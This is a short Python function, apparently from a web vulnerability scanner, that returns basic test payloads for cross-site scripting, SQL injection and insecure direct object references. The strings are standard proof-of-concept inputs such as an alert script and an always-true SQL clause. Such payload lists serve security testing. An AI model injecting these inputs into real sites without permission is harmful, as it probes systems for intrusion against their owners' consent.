def get_all_payloads():
    return {
        "xss": [
            "<script>alert(1)</script>",
            "<img src=x onerror=alert(1)>"
        ],
        "sqli": [
            "' OR 1=1--",
            "\" OR \"1\"=\"1"
        ],
        "idor": [
            "?id=1",
            "?user_id=1"
        ]
    }
